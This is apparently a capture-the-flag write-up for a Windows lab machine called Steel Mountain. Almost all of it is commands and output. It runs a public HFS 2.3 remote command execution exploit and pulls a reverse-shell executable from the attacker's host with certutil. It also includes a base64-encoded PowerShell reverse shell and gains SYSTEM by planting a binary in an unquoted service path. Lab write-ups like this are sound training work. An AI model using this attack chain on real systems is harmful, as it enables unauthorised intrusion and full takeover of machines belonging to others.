## MACHINE IP
```bash
10.201.65.223
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Fri Sep  5 02:25:07 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.65.223
Nmap scan report for 10.201.65.223
Host is up (0.30s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-04T20:57:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-09-03T20:44:26
| Not valid after:  2026-03-05T20:44:26
| MD5:   0752:bdaf:af13:f78c:4615:b69e:db35:2ba6
|_SHA-1: b8eb:aee3:e98c:1186:eecc:b14d:00aa:3ff5:2b48:648d
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-09-04T20:57:02+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49185/tcp open  msrpc         Microsoft Windows RPC
49186/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-04T20:56:59
|_  start_date: 2025-09-04T20:43:22
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:dc:73:6e:ed (unknown)
| Names:
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  STEELMOUNTAIN<20>    Flags: <unique><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  5 02:27:08 2025 -- 1 IP address (1 host up) scanned in 121.19 seconds
```
## OPEN PORTS - ANALYSIS
```bash
# SMB
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

# HTTP/HTTPS
80/tcp    open  http          Microsoft IIS httpd 8.5
8080/tcp  open  http          HttpFileServer httpd 2.3

# RPC
135/tcp   open  msrpc         Microsoft Windows RPC

# RDP
3389/tcp  open  ms-wbt-server Microsoft Terminal Services

# WINRM
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# OTHERS
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49185/tcp open  msrpc         Microsoft Windows RPC
49186/tcp open  msrpc         Microsoft Windows RPC
```
## RECON
```bash
# Operating System
Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600                       
```
## ENUMERATION
## PORT 8080 - HFS 2.3
```bash
# Checking exploit for HTTP File Server (HFS) 2.3
sudo searchsploit hfs 2.3
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py

# Mirror the exploit file
sudo searchsploit -m windows/remote/39161.py

# Checking the exploit script 
EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe)

- Seems like we need to host nc.exe on a web server while running the exploit
- Change ip_addr and local_port to our machine ip and port 
  
# Host nc.exe on a server
cp /usr/share/windows-resources/binaries/nc.exe .
sudo python3 -m http.server 80

# Start a Listener on the local port we changed
sudo rlwrap nc -nvlp 53

# Exploit Script Usage
python2.7 39161.py 
Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>

# Run the exploit script 
python2.7 39161.py 10.201.65.223 8080
```
## INITIAL SHELL
```bash
sudo rlwrap nc -nvlp 53
listening on [any] 53 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.65.223] 49264
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
whoami
steelmountain\bill

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::bc09:b293:6d0a:7d3a%14
   IPv4 Address. . . . . . . . . . . : 10.201.65.223
   Subnet Mask . . . . . . . . . . . : 255.255.128.0
   Default Gateway . . . . . . . . . : 10.201.0.1

Tunnel adapter isatap.ec2.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ec2.internal
   
# Improved Stable Shell
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=53 -f exe -o rev.exe

# Transfer + Start Listener + Improved Shell
C:\Windows\Tasks>certutil -f -urlcache http://10.13.80.25/rev.exe C:\Windows\Tasks\rev.exe
certutil -f -urlcache http://10.13.80.25/rev.exe C:\Windows\Tasks\rev.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

sudo rlwrap nc -nvlp 53
C:\Windows\Tasks>.\rev.exe

# Get Proper Powershell Reverse Shell - https://www.revshells.com/
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAzAC4AOAAwAC4AMgA1ACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

sudo rlwrap nc -nvlp 53
```
## PRIVILEGE ESCALATION
```bash
# Transfer PowerUp.ps1 and Invoke-AllChecks
PS C:\Windows\Tasks> Import-Module .\PowerUp.ps1; Invoke-AllChecks

# Modifiable Service with Unquoted Service Path
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced 
                 SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; 
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path 
                 <HijackPath>
CanRestart     : True

# Service Misconfiguration - Unquoted Service path
- From cmd.exe Shell
C:\Windows\Tasks>sc qc AdvancedSystemCareService9
sc qc AdvancedSystemCareService9
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
  
C:\Windows\Tasks>sc query AdvancedSystemCareService9
sc query AdvancedSystemCareService9
SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
  
- Check Path C:\Program Files (x86)\IObit\Advanced SystemCare write permissions
C:\Windows\Tasks>icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"
icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"
C:\Program Files (x86)\IObit\Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
                                                 NT SERVICE\TrustedInstaller:(I)(F)
                                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                                 NT AUTHORITY\SYSTEM:(I)(F)
                                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                 BUILTIN\Administrators:(I)(F)
                                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                 BUILTIN\Users:(I)(RX)
                                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
  
- Can see that STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W) - got Read and Write permission on   "C:\Program Files (x86)\IObit\Advanced SystemCare" path

C:\Windows\Tasks>copy C:\Windows\Tasks\rev.exe "C:\Program Files (x86)\IObit\Advanced.exe"
copy C:\Windows\Tasks\rev.exe "C:\Program Files (x86)\IObit\Advanced.exe"
        1 file(s) copied.

- Start a Listener
sudo rlwrap nc -nvlp 53

- Stop and Start the service AdvancedSystemCareService9
net stop AdvancedSystemCareService9    
net start AdvancedSystemCareService9  
```
## ROOT | ADMINISTRATOR - PWNED
```bash
sudo rlwrap nc -nvlp 53                    
listening on [any] 53 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.65.223] 49307
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::bc09:b293:6d0a:7d3a%14
   IPv4 Address. . . . . . . . . . . : 10.201.65.223
   Subnet Mask . . . . . . . . . . . : 255.255.128.0
   Default Gateway . . . . . . . . . : 10.201.0.1

Tunnel adapter isatap.ec2.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ec2.internal
```
